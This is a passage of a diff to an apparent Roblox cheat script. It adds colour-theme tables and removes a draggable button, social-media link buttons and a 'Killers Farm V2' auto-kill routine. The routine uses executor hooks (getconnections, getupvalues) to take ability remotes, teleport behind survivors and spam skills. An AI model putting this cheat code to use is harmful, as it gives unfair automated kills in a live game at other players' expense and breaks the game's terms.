+		DropdownFrame = Color3.fromRGB(200, 95, 125),
+		DropdownHolder = Color3.fromRGB(75, 30, 45),
+		DropdownBorder = Color3.fromRGB(95, 35, 55),
+		DropdownOption = Color3.fromRGB(190, 75, 105),
+		Keybind = Color3.fromRGB(190, 75, 105),
+		Input = Color3.fromRGB(190, 75, 105),
+		InputFocused = Color3.fromRGB(35, 15, 20),
+		InputIndicator = Color3.fromRGB(210, 95, 125),
+		InputIndicatorFocus = Color3.fromRGB(219, 48, 123),
+		Dialog = Color3.fromRGB(75, 30, 45),
+		DialogHolder = Color3.fromRGB(65, 25, 40),
+		DialogHolderLine = Color3.fromRGB(60, 20, 35),
+		DialogButton = Color3.fromRGB(75, 30, 45),
+		DialogButtonBorder = Color3.fromRGB(115, 45, 65),
+		DialogBorder = Color3.fromRGB(105, 40, 60),
+		DialogInput = Color3.fromRGB(85, 35, 50),
+		DialogInputLine = Color3.fromRGB(200, 85, 115),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(190, 75, 105),
+		HoverChange = 0.04
+	},
+	Midnight = {
+		Name = "Midnight",
+		Accent = Color3.fromRGB(52, 50, 178),
+		AcrylicMain = Color3.fromRGB(20, 20, 20),
+		AcrylicBorder = Color3.fromRGB(83, 83, 130),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(1, 1, 39), Color3.fromRGB(6, 6, 54)),
+		AcrylicNoise = 0.96,
+		TitleBarLine = Color3.fromRGB(77, 75, 126),
+		Tab = Color3.fromRGB(126, 127, 180),
+		Element = Color3.fromRGB(111, 108, 160),
+		ElementBorder = Color3.fromRGB(32, 32, 59),
+		InElementBorder = Color3.fromRGB(85, 83, 110),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(120, 117, 160),
+		ToggleToggled = Color3.fromRGB(30, 12, 68),
+		SliderRail = Color3.fromRGB(117, 117, 160),
+		DropdownFrame = Color3.fromRGB(161, 161, 200),
+		DropdownHolder = Color3.fromRGB(35, 36, 80),
+		DropdownBorder = Color3.fromRGB(32, 30, 65),
+		DropdownOption = Color3.fromRGB(116, 116, 160),
+		Keybind = Color3.fromRGB(110, 123, 160),
+		Input = Color3.fromRGB(116, 112, 160),
+		InputFocused = Color3.fromRGB(20, 10, 30),
+		InputIndicator = Color3.fromRGB(136, 140, 190),
+		Dialog = Color3.fromRGB(37, 37, 80),
+		DialogHolder = Color3.fromRGB(24, 24, 65),
+		DialogHolderLine = Color3.fromRGB(25, 26, 60),
+		DialogButton = Color3.fromRGB(46, 44, 80),
+		DialogButtonBorder = Color3.fromRGB(71, 72, 110),
+		DialogBorder = Color3.fromRGB(72, 70, 100),
+		DialogInput = Color3.fromRGB(55, 55, 85),
+		DialogInputLine = Color3.fromRGB(133, 131, 190),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(119, 121, 160),
+		HoverChange = 0.04,
+	},
+	Forest = {
+		Name = "Forest",
+		Accent = Color3.fromRGB(46, 141, 70),
+		AcrylicMain = Color3.fromRGB(20, 35, 25),
+		AcrylicBorder = Color3.fromRGB(50, 90, 60),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(15, 35, 20), Color3.fromRGB(20, 40, 25)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(60, 100, 70),
+		Tab = Color3.fromRGB(80, 140, 90),
+		Element = Color3.fromRGB(70, 120, 80),
+		ElementBorder = Color3.fromRGB(30, 50, 35),
+		InElementBorder = Color3.fromRGB(60, 90, 70),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(90, 150, 100),
+		ToggleToggled = Color3.fromRGB(19, 57, 21),
+		SliderRail = Color3.fromRGB(90, 150, 100),
+		DropdownFrame = Color3.fromRGB(100, 160, 110),
+		DropdownHolder = Color3.fromRGB(35, 60, 40),
+		DropdownBorder = Color3.fromRGB(30, 50, 35),
+		DropdownOption = Color3.fromRGB(90, 150, 100),
+		Keybind = Color3.fromRGB(90, 150, 100),
+		Input = Color3.fromRGB(90, 150, 100),
+		InputFocused = Color3.fromRGB(15, 25, 18),
+		InputIndicator = Color3.fromRGB(110, 170, 120),
+		InputIndicatorFocus = Color3.fromRGB(46, 141, 70),
+		Dialog = Color3.fromRGB(35, 60, 40),
+		DialogHolder = Color3.fromRGB(30, 50, 35),
+		DialogHolderLine = Color3.fromRGB(25, 45, 30),
+		DialogButton = Color3.fromRGB(35, 60, 40),
+		DialogButtonBorder = Color3.fromRGB(70, 110, 80),
+		DialogBorder = Color3.fromRGB(60, 100, 70),
+		DialogInput = Color3.fromRGB(45, 70, 50),
+		DialogInputLine = Color3.fromRGB(100, 160, 110),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(90, 150, 100),
+		HoverChange = 0.04
+	},
+	Sunset = {
+		Name = "Sunset",
+		Accent = Color3.fromRGB(255, 128, 0),
+		AcrylicMain = Color3.fromRGB(40, 25, 25),
+		AcrylicBorder = Color3.fromRGB(130, 80, 60),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(70, 35, 20), Color3.fromRGB(60, 30, 20)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(140, 90, 70),
+		Tab = Color3.fromRGB(180, 120, 90),
+		Element = Color3.fromRGB(160, 100, 70),
+		ElementBorder = Color3.fromRGB(70, 40, 30),
+		InElementBorder = Color3.fromRGB(110, 70, 50),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(180, 110, 80),
+		ToggleToggled = Color3.fromRGB(62, 34, 21),
+		SliderRail = Color3.fromRGB(180, 110, 80),
+		DropdownFrame = Color3.fromRGB(190, 130, 100),
+		DropdownHolder = Color3.fromRGB(60, 35, 25),
+		DropdownBorder = Color3.fromRGB(70, 40, 30),
+		DropdownOption = Color3.fromRGB(180, 110, 80),
+		Keybind = Color3.fromRGB(180, 110, 80),
+		Input = Color3.fromRGB(180, 110, 80),
+		InputFocused = Color3.fromRGB(30, 20, 15),
+		InputIndicator = Color3.fromRGB(200, 130, 100),
+		InputIndicatorFocus = Color3.fromRGB(255, 128, 0),
+		Dialog = Color3.fromRGB(60, 35, 25),
+		DialogHolder = Color3.fromRGB(50, 30, 20),
+		DialogHolderLine = Color3.fromRGB(45, 25, 15),
+		DialogButton = Color3.fromRGB(60, 35, 25),
+		DialogButtonBorder = Color3.fromRGB(100, 65, 45),
+		DialogBorder = Color3.fromRGB(90, 55, 40),
+		DialogInput = Color3.fromRGB(70, 45, 35),
+		DialogInputLine = Color3.fromRGB(190, 120, 90),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(180, 110, 80),
+		HoverChange = 0.04
+	},
+	Ocean = {
+		Name = "Ocean",
+		Accent = Color3.fromRGB(0, 141, 255),
+		AcrylicMain = Color3.fromRGB(20, 25, 40),
+		AcrylicBorder = Color3.fromRGB(40, 60, 100),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(15, 25, 45), Color3.fromRGB(20, 30, 50)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(50, 70, 120),
+		Tab = Color3.fromRGB(70, 90, 160),
+		Element = Color3.fromRGB(60, 80, 140),
+		ElementBorder = Color3.fromRGB(30, 40, 70),
+		InElementBorder = Color3.fromRGB(50, 60, 100),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(80, 100, 170),
+		ToggleToggled = Color3.fromRGB(11, 35, 67),
+		SliderRail = Color3.fromRGB(80, 100, 170),
+		DropdownFrame = Color3.fromRGB(90, 110, 180),
+		DropdownHolder = Color3.fromRGB(25, 35, 60),
+		DropdownBorder = Color3.fromRGB(30, 40, 70),
+		DropdownOption = Color3.fromRGB(80, 100, 170),
+		Keybind = Color3.fromRGB(80, 100, 170),
+		Input = Color3.fromRGB(80, 100, 170),
+		InputFocused = Color3.fromRGB(15, 20, 35),
+		InputIndicator = Color3.fromRGB(100, 120, 190),
+		InputIndicatorFocus = Color3.fromRGB(0, 141, 255),
+		Dialog = Color3.fromRGB(25, 35, 60),
+		DialogHolder = Color3.fromRGB(20, 30, 55),
+		DialogHolderLine = Color3.fromRGB(15, 25, 50),
+		DialogButton = Color3.fromRGB(25, 35, 60),
+		DialogButtonBorder = Color3.fromRGB(45, 65, 110),
+		DialogBorder = Color3.fromRGB(40, 60, 100),
+		DialogInput = Color3.fromRGB(35, 45, 70),
+		DialogInputLine = Color3.fromRGB(90, 110, 180),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(80, 100, 170),
+		HoverChange = 0.04
+	},
+	Emerald = {
+		Name = "Emerald",
+		Accent = Color3.fromRGB(0, 168, 107),
+		AcrylicMain = Color3.fromRGB(20, 35, 30),
+		AcrylicBorder = Color3.fromRGB(30, 100, 80),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(20, 55, 45), Color3.fromRGB(25, 60, 50)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(40, 110, 90),
+		Tab = Color3.fromRGB(50, 130, 100),
+		Element = Color3.fromRGB(40, 120, 95),
+		ElementBorder = Color3.fromRGB(25, 75, 60),
+		InElementBorder = Color3.fromRGB(35, 85, 70),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(45, 130, 100),
+		ToggleToggled = Color3.fromRGB(15, 40, 30),
+		SliderRail = Color3.fromRGB(45, 130, 100),
+		DropdownFrame = Color3.fromRGB(55, 140, 110),
+		DropdownHolder = Color3.fromRGB(20, 70, 55),
+		DropdownBorder = Color3.fromRGB(25, 75, 60),
+		DropdownOption = Color3.fromRGB(45, 130, 100),
+		Keybind = Color3.fromRGB(45, 130, 100),
+		Input = Color3.fromRGB(45, 130, 100),
+		InputFocused = Color3.fromRGB(10, 35, 25),
+		InputIndicator = Color3.fromRGB(55, 150, 120),
+		InputIndicatorFocus = Color3.fromRGB(0, 168, 107),
+		Dialog = Color3.fromRGB(20, 70, 55),
+		DialogHolder = Color3.fromRGB(15, 65, 50),
+		DialogHolderLine = Color3.fromRGB(15, 60, 45),
+		DialogButton = Color3.fromRGB(20, 70, 55),
+		DialogButtonBorder = Color3.fromRGB(30, 90, 70),
+		DialogBorder = Color3.fromRGB(25, 85, 65),
+		DialogInput = Color3.fromRGB(25, 75, 60),
+		DialogInputLine = Color3.fromRGB(50, 140, 110),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(45, 130, 100),
+		HoverChange = 0.04
+	},
+	Sapphire = {
+		Name = "Sapphire",
+		Accent = Color3.fromRGB(0, 105, 255),
+		AcrylicMain = Color3.fromRGB(24, 30, 85),
+		AcrylicBorder = Color3.fromRGB(25, 80, 150),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(13, 33, 94), Color3.fromRGB(21, 44, 127)),
+		AcrylicNoise = 0.88,
+		TitleBarLine = Color3.fromRGB(50, 120, 200),
+		Tab = Color3.fromRGB(60, 140, 220),
+		Element = Color3.fromRGB(42, 98, 176),
+		ElementBorder = Color3.fromRGB(23, 66, 113),
+		InElementBorder = Color3.fromRGB(27, 65, 126),
+		ElementTransparency = 0.85,
+		ToggleSlider = Color3.fromRGB(50, 140, 210),
+		ToggleToggled = Color3.fromRGB(20, 50, 80),
+		SliderRail = Color3.fromRGB(50, 140, 210),
+		DropdownFrame = Color3.fromRGB(60, 150, 230),
+		DropdownHolder = Color3.fromRGB(15, 60, 100),
+		DropdownBorder = Color3.fromRGB(30, 90, 140),
+		DropdownOption = Color3.fromRGB(50, 140, 210),
+		Keybind = Color3.fromRGB(50, 140, 210),
+		Input = Color3.fromRGB(50, 140, 210),
+		InputFocused = Color3.fromRGB(15, 40, 60),
+		InputIndicator = Color3.fromRGB(60, 160, 240),
+		InputIndicatorFocus = Color3.fromRGB(0, 105, 255),
+		Dialog = Color3.fromRGB(10, 60, 100),
+		DialogHolder = Color3.fromRGB(15, 50, 90),
+		DialogHolderLine = Color3.fromRGB(15, 45, 80),
+		DialogButton = Color3.fromRGB(10, 60, 100),
+		DialogButtonBorder = Color3.fromRGB(30, 100, 160),
+		DialogBorder = Color3.fromRGB(20, 80, 130),
+		DialogInput = Color3.fromRGB(30, 90, 140),
+		DialogInputLine = Color3.fromRGB(55, 150, 230),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(50, 140, 210),
+		HoverChange = 0.05
+	},
+	Cloud = {
+		Name = "Cloud",
+		Accent = Color3.fromRGB(27, 114, 138),
+		AcrylicMain = Color3.fromRGB(13, 62, 77),
+		AcrylicBorder = Color3.fromRGB(80, 118, 130),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(51, 74, 83), Color3.fromRGB(4, 47, 66)),
+		AcrylicNoise = 0.94,
+		TitleBarLine = Color3.fromRGB(97, 97, 97),
+		Tab = Color3.fromRGB(126, 175, 180),
+		Element = Color3.fromRGB(66, 130, 160),
+		ElementBorder = Color3.fromRGB(40, 100, 122),
+		InElementBorder = Color3.fromRGB(75, 109, 110),
+		ElementTransparency = 0.87,
+		ToggleSlider = Color3.fromRGB(100, 152, 160),
+		ToggleToggled = Color3.fromRGB(26, 59, 80),
+		SliderRail = Color3.fromRGB(115, 150, 160),
+		DropdownFrame = Color3.fromRGB(158, 194, 200),
+		DropdownHolder = Color3.fromRGB(39, 99, 116),
+		DropdownBorder = Color3.fromRGB(33, 119, 120),
+		DropdownOption = Color3.fromRGB(121, 152, 160),
+		Keybind = Color3.fromRGB(108, 153, 160),
+		Input = Color3.fromRGB(112, 156, 160),
+		InputFocused = Color3.fromRGB(14, 35, 40),
+		InputIndicator = Color3.fromRGB(137, 181, 190),
+		Dialog = Color3.fromRGB(11, 75, 88),
+		DialogHolder = Color3.fromRGB(18, 77, 93),
+		DialogHolderLine = Color3.fromRGB(33, 76, 86),
+		DialogButton = Color3.fromRGB(43, 72, 80),
+		DialogButtonBorder = Color3.fromRGB(62, 100, 110),
+		DialogBorder = Color3.fromRGB(26, 86, 100),
+		DialogInput = Color3.fromRGB(4, 97, 107),
+		DialogInputLine = Color3.fromRGB(70, 120, 130),
+		Text = Color3.fromRGB(209, 240, 233),
+		SubText = Color3.fromRGB(170, 170, 170),
+		Hover = Color3.fromRGB(112, 155, 160),
+		HoverChange = 0.04,
+	},
+	Grape = {
+		Name = "Grape",
+		Accent = Color3.fromRGB(183, 176, 223),
+		AcrylicMain = Color3.fromRGB(0, 0, 0),
+		AcrylicBorder = Color3.fromRGB(20, 20, 20),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(6, 0, 16), Color3.fromRGB(6, 0, 16)),
+		AcrylicNoise = 1,
+		TitleBarLine = Color3.fromRGB(25, 25, 25),
+		Tab = Color3.fromRGB(40, 40, 40),
+		Element = Color3.fromRGB(15, 15, 15),
+		ElementBorder = Color3.fromRGB(6, 0, 16),
+		InElementBorder = Color3.fromRGB(40, 40, 40),
+		ElementTransparency = 1,
+		ToggleSlider = Color3.fromRGB(255, 255, 255),
+		ToggleToggled = Color3.fromRGB(19, 16, 36),
+		SliderRail = Color3.fromRGB(40, 40, 40),
+		DropdownFrame = Color3.fromRGB(20, 20, 20),
+		DropdownHolder = Color3.fromRGB(12, 0, 34),
+		DropdownBorder = Color3.fromRGB(6, 0, 16),
+		DropdownOption = Color3.fromRGB(40, 40, 40),
+		Keybind = Color3.fromRGB(40, 40, 40),
+		Input = Color3.fromRGB(40, 40, 40),
+		InputFocused = Color3.fromRGB(6, 0, 16),
+		InputIndicator = Color3.fromRGB(60, 60, 60),
+		InputIndicatorFocus = Color3.fromRGB(255, 255, 255),
+		Dialog = Color3.fromRGB(7, 0, 18),
+		DialogHolder = Color3.fromRGB(7, 0, 18),
+		DialogHolderLine = Color3.fromRGB(7, 0, 18),
+		DialogButton = Color3.fromRGB(13, 0, 33),
+		DialogButtonBorder = Color3.fromRGB(30, 30, 30),
+		DialogBorder = Color3.fromRGB(27, 27, 27),
+		DialogInput = Color3.fromRGB(7, 0, 18),
+		DialogInputLine = Color3.fromRGB(60, 60, 60),
+		Text = Color3.fromRGB(255, 255, 255),
+		SubText = Color3.fromRGB(123, 144, 170),
+		Hover = Color3.fromRGB(40, 40, 40),
+		HoverChange = 0.04
+	},
+	Bloody = {
+		Name = "Bloody",
+		Accent = Color3.fromRGB(144, 0, 0),
+		AcrylicMain = Color3.fromRGB(61, 0, 0),
+		AcrylicBorder = Color3.fromRGB(86, 0, 0),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(90, 0, 0), Color3.fromRGB(100, 0, 0)),
+		AcrylicNoise = 0.92,
+		TitleBarLine = Color3.fromRGB(126, 0, 0),
+		Tab = Color3.fromRGB(134, 0, 0),
+		Element = Color3.fromRGB(156, 0, 0),
+		ElementBorder = Color3.fromRGB(91, 0, 0),
+		InElementBorder = Color3.fromRGB(106, 0, 0),
+		ElementTransparency = 0.86,
+		ToggleSlider = Color3.fromRGB(130, 5, 5),
+		ToggleToggled = Color3.fromRGB(66, 0, 0),
+		SliderRail = Color3.fromRGB(150, 30, 30),
+		DropdownFrame = Color3.fromRGB(150, 30, 30),
+		DropdownHolder = Color3.fromRGB(79, 0, 0),
+		DropdownBorder = Color3.fromRGB(116, 0, 0),
+		DropdownOption = Color3.fromRGB(150, 30, 30),
+		Keybind = Color3.fromRGB(150, 30, 30),
+		Input = Color3.fromRGB(150, 30, 30),
+		InputFocused = Color3.fromRGB(40, 10, 10),
+		InputIndicator = Color3.fromRGB(113, 1, 1),
+		Dialog = Color3.fromRGB(85, 0, 1),
+		DialogHolder = Color3.fromRGB(77, 0, 8),
+		DialogHolderLine = Color3.fromRGB(88, 4, 4),
+		DialogButton = Color3.fromRGB(115, 14, 21),
+		DialogButtonBorder = Color3.fromRGB(83, 0, 1),
+		DialogBorder = Color3.fromRGB(43, 4, 5),
+		DialogInput = Color3.fromRGB(108, 20, 21),
+		DialogInputLine = Color3.fromRGB(91, 1, 1),
+		Text = Color3.fromRGB(240, 240, 240),
+		SubText = Color3.fromRGB(131, 131, 131),
+		Hover = Color3.fromRGB(181, 0, 0),
+		HoverChange = 0.04
+	},
+	Arctic = {
+		Name = "Arctic",
+		Accent = Color3.fromRGB(64, 224, 255),
+		AcrylicMain = Color3.fromRGB(10, 18, 25),
+		AcrylicBorder = Color3.fromRGB(35, 55, 70),
+		AcrylicGradient = ColorSequence.new(Color3.fromRGB(15, 25, 35), Color3.fromRGB(18, 30, 40)),
+		AcrylicNoise = 0.94,
+		TitleBarLine = Color3.fromRGB(45, 70, 90),
+		Tab = Color3.fromRGB(70, 110, 140),
+		Element = Color3.fromRGB(60, 95, 120),
+		ElementBorder = Color3.fromRGB(60, 95, 120),
+		InElementBorder = Color3.fromRGB(70, 110, 140),
+		ElementTransparency = 0.88,
+		ToggleSlider = Color3.fromRGB(90, 140, 180),
+		ToggleToggled = Color3.fromRGB(15, 25, 35),
+		SliderRail = Color3.fromRGB(90, 140, 180),
+		DropdownFrame = Color3.fromRGB(110, 170, 220),
+		DropdownHolder = Color3.fromRGB(30, 45, 60),
+		DropdownBorder = Color3.fromRGB(60, 95, 120),
+		DropdownOption = Color3.fromRGB(90, 140, 180),
+		Keybind = Color3.fromRGB(90, 140, 180),
+		Input = Color3.fromRGB(90, 140, 180),
+		InputFocused = Color3.fromRGB(10, 18, 25),
+		InputIndicator = Color3.fromRGB(130, 200, 255),
+		InputIndicatorFocus = Color3.fromRGB(64, 224, 255),
+		Dialog = Color3.fromRGB(30, 45, 60),
+		DialogHolder = Color3.fromRGB(18, 30, 40),
+		DialogHolderLine = Color3.fromRGB(15, 25, 35),
+		DialogButton = Color3.fromRGB(30, 45, 60),
+		DialogButtonBorder = Color3.fromRGB(45, 70, 90),
+		DialogBorder = Color3.fromRGB(40, 60, 80),
+		DialogInput = Color3.fromRGB(35, 55, 70),
+		DialogInputLine = Color3.fromRGB(110, 170, 220),
+		Text = Color3.fromRGB(240, 250, 255),
+		SubText = Color3.fromRGB(180, 200, 220),
+		Hover = Color3.fromRGB(90, 140, 180),
+		HoverChange = 0.04
+	}
 
-local dragging = false
-local dragInput
-local dragStart
-local startPos
-local holdTime = 0.1
-local holdStarted = 0
-
-local function update(input)
-    local delta = input.Position - dragStart
-    btnHide.Position = UDim2.new(
-        startPos.X.Scale,
-        startPos.X.Offset + delta.X,
-        startPos.Y.Scale,
-        startPos.Y.Offset + delta.Y
-    )
-end
-
-btnHide.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-        holdStarted = tick()
-        dragStart = input.Position
-        startPos = btnHide.Position
-
-        input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then
-                dragging = false
-                holdStarted = 0
-            end
-        end)
-    end
-end)
-
-btnHide.InputChanged:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-        dragInput = input
-    end
-end)
-
-RunService.RenderStepped:Connect(function()
-    if holdStarted > 0 and tick() - holdStarted >= holdTime and not dragging then
-        dragging = true
-    end
-
-    if dragging and dragInput then
-        update(dragInput)
-    end
-end)
-
-
-
--- Tab.Dev
-
-local Options = Fluent.Options
-
-
-    Tabs.Dev:AddParagraph({
-        Title = "Note",
-        Content = "Thank you for using the script!"
-    })
-
-    Tabs.Dev:AddSection("Links")
-
-    Tabs.Dev:AddButton({
-        Title = "Discord",
-        Description = "Copy the link to join the discord!",
-        Callback = function()
-            setclipboard("https://discord.gg/WEGT92yv")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
-
-
-
-    Tabs.Dev:AddButton({
-        Title = "Youtube",
-        Description = "Copy link to Subscribe to Youtube channel!",
-        Callback = function()
-            setclipboard("https://www.youtube.com/@SLKgamingSSR")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
-
-
-    Tabs.Dev:AddButton({
-        Title = "Facebook",
-        Description = "Copy link to join facebook group!",
-        Callback = function()
-            setclipboard("https://www.facebook.com/groups/1180845463307087/?ref=share&mibextid=NSMWBT")
-            Fluent:Notify({
-                Title = "Notification",
-                Content = "Successfully copied to the clipboard!",
-                SubContent = "", -- Optional
-                Duration = 3 
-            })
-        end
-    })
-
--- Tabs.Farm
-
-
-
-
-do
-    local Players = game:GetService("Players")
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local LocalPlayer = Players.LocalPlayer
-
-    local Active = false
-    local loopRunning = false
-    local CurrentTarget = nil
-    local lastAttack = 0
-
-    -- 🟥 Chỉ chạy khi là các model này
-    local KillersList = {
-        ["Slasher"] = true,
-        ["1x1x1x1"] = true,
-        ["c00lkidd"] = true,
-        ["Noli"] = true,
-        ["JohnDoe"] = true,
-        ["Guest 666"] = true,
-        ["Sixer"] = true,
-    }
-
-    -- 🟢 Danh sách ưu tiên
-    local PriorityList = {
-        ["0206octavio"] = true
-    }
-
-    -- 🔥 Danh sách skill (full, có thể thêm/bớt thoải mái)
-    local SkillList = {
-        "Slash", "Stab", "Punch",
-        "VoidRush", "Nova",
-        "CorruptEnergy", "Behead", "GashingWound",
-        "MassInfection", "CorruptNature", "WalkspeedOverride", "PizzaDelivery",
-        "UnstableEye", "Entanglement",
-        "DigitalFootprint", "404Error",
-        "RagingPace", "Carving Slash", "Demonic Pursuit",
-        "Infernal Cry", "Blood Rush"
-    }
-
-    -- =====================
-    -- 🗡️ RemoteEvent Finder
-    -- =====================
-    local SkillRemotes = {}
-
-    local function findSkillRemoteFromButton(button)
-        for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
-            local f = conn.Function
-            if f and islclosure(f) then
-                for _, v in pairs(getupvalues(f)) do
-                    if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
-                        return v
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function initSkillButtons()
-        local gui = LocalPlayer:FindFirstChild("PlayerGui")
-        if not gui then return end
-        local mainUI = gui:FindFirstChild("MainUI")
-        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-        if not container then return end
-
-        for _, child in ipairs(container:GetChildren()) do
-            if child:IsA("ImageButton") then
-                local remote = findSkillRemoteFromButton(child)
-                if remote then
-                    SkillRemotes[child.Name] = remote
-                end
-            end
-        end
-    end
-
-    initSkillButtons()
-    LocalPlayer.CharacterAdded:Connect(function()
-        task.wait(1)
-        initSkillButtons()
-    end)
-
-    -- =====================
-    -- 🎯 Target Finder
-    -- =====================
-    local function GetPriorityTarget()
-        local survivorsFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Survivors")
-        if not survivorsFolder then return nil end
-
-        for _, survivor in ipairs(survivorsFolder:GetChildren()) do
-            if survivor:IsA("Model") and survivor:FindFirstChild("HumanoidRootPart") then
-                if PriorityList[survivor.Name] then
-                    local humanoid = survivor:FindFirstChildOfClass("Humanoid")
-                    if humanoid and humanoid.Health > 0 then
-                        return survivor
-                    end
-                end
-            end
-        end
-        return nil
-    end
-
-    local function GetClosestSurvivor()
-        local priorityTarget = GetPriorityTarget()
-        if priorityTarget then return priorityTarget end
-
-        local localChar = LocalPlayer.Character
-        if not (localChar and localChar:FindFirstChild("HumanoidRootPart")) then return nil end
-        local survivorsFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Survivors")
-        if not survivorsFolder then return nil end
-
-        local closest, minDist = nil, math.huge
-        for _, survivor in ipairs(survivorsFolder:GetChildren()) do
-            local humanoid = survivor:FindFirstChildOfClass("Humanoid")
-            if survivor:IsA("Model") and survivor:FindFirstChild("HumanoidRootPart") and humanoid and humanoid.Health > 0 then
-                local dist = (localChar.HumanoidRootPart.Position - survivor.HumanoidRootPart.Position).Magnitude
-                if dist < minDist then
-                    minDist = dist
-                    closest = survivor
-                end
-            end
-        end
-        return closest
-    end
-
-    -- =====================
-    -- 🗡️ Kill Logic (spam nhanh + Remote + UI Click)
-    -- =====================
-    local function KillTarget(target)
-        pcall(function()
-            if not target then return end
-            local localChar = LocalPlayer.Character
-            if not (localChar and localChar:FindFirstChild("HumanoidRootPart")) then return end
-
-            local root = localChar.HumanoidRootPart
-            local targetRoot = target:FindFirstChild("HumanoidRootPart")
-            if not targetRoot then return end
-
-            -- Spam skill (mỗi 0.05s)
-            if tick() - lastAttack >= 0.05 then
-                lastAttack = tick()
-
-                for _, skillName in ipairs(SkillList) do
-                    -- luôn cập nhật vị trí sát lưng target trước khi dùng skill
-                    local offset = targetRoot.CFrame.LookVector * -2
-                    root.CFrame = targetRoot.CFrame + offset
-
-                    local remote = SkillRemotes[skillName]
-                    if remote then
-                        -- Cách 1: FireServer trực tiếp
-                        remote:FireServer(true)
-                        task.wait(0.005)
-                        remote:FireServer(false)
-                    else
-                        -- Cách 2: Giả click nút skill trong GUI
-                        local gui = LocalPlayer:FindFirstChild("PlayerGui")
-                        local mainUI = gui and gui:FindFirstChild("MainUI")
-                        local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
-                        if container then
-                            local button = container:FindFirstChild(skillName)
-                            if button and button:IsA("ImageButton") then
-                                for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
-                                    if conn.Function then
-                                        pcall(conn.Function)
-                                    end
-                                end
-                                pcall(function() button:Activate() end)
-                            end
-                        end
-
-                        -- fallback cuối cùng: Remote gốc trong ReplicatedStorage
-                        local net = ReplicatedStorage:FindFirstChild("Modules")
-                                    and ReplicatedStorage.Modules:FindFirstChild("Network")
-                                    and ReplicatedStorage.Modules.Network:FindFirstChild("RemoteEvent")
-                        if net and typeof(net.FireServer) == "function" then
-                            net:FireServer("UseActorAbility", skillName)
-                        end
-                    end
-
-                    task.wait(0.01) -- giữ nhịp nhanh
-                end
-            end
-        end)
-    end
-
-    -- =====================
-    -- 🔄 Main Loop
-    -- =====================
-    local function StartLoop()
-        if loopRunning then return end
-        loopRunning = true
-        task.spawn(function()
-            while Active do
-                -- 🛑 Nếu không phải killer hợp lệ thì không làm gì
-                local char = LocalPlayer.Character
-                if not (char and KillersList[char.Name]) then
-                    CurrentTarget = nil
-                    task.wait(0.5)
-                    continue
-                end
-
-                if not CurrentTarget 
-                   or not CurrentTarget.Parent 
-                   or not CurrentTarget:FindFirstChildOfClass("Humanoid") 
-                   or CurrentTarget:FindFirstChildOfClass("Humanoid").Health <= 0 then
-                    CurrentTarget = GetClosestSurvivor()
-                end
-                if CurrentTarget then
-                    KillTarget(CurrentTarget)
-                end
-                task.wait(0.01)
-            end
-            loopRunning = false
-        end)
-    end
-
-    Tabs.Farm:AddToggle("KillersFarmV2", {
-        Title = "Killers Farm V2",
-        Default = false,
-        Callback = function(Value)
-            Active = Value
-            if Active then
-                StartLoop()
-            end
-        end
-    })
-end
-
-
-
-
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
-
-local solveGeneratorCooldown = false
-local genDelay = 0.75 -- delay mặc định
-local currentCharacter
-local Spectators = {}
-local isInGame, Survivor = false, false
-
--- 🟥 Killer nguy hiểm
-local DangerousKillers = {
-    ["Slasher"] = true,
-    ["1x1x1x1"] = true,
-    ["c00lkidd"] = true,
-    ["Noli"] = true,
-    ["JohnDoe"] = true,
-    ["Guest 666"] = true,
-    ["Sixer"] = true
 }
